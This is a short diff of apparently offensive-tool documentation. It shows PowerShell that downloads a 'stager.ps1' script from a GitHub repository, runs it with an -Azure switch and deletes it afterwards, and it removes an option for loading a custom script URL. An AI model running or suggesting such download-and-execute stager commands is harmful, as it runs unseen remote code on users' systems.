@@ -4,14 +4,11 @@
 ```powershell
 $stagerUrl = "https://raw.githubusercontent.com/MelloSec/RepeatOffender/main/stager.ps1"
 
-$tempFile = New-TemporaryFile
+$tempFile = ".\stager.ps1"
 Invoke-WebRequest -Uri $stagerUrl -OutFile $tempFile -UseBasicParsing
 
 # Execute the temporary file with the Azure switch
 & $tempFile -Azure
-
-# Or, to pass a custom script URL
-& $tempFile -scriptUrl "https://example.com/custom-script.ps1"
 
 # Clean up the temporary file
 Remove-Item $tempFile
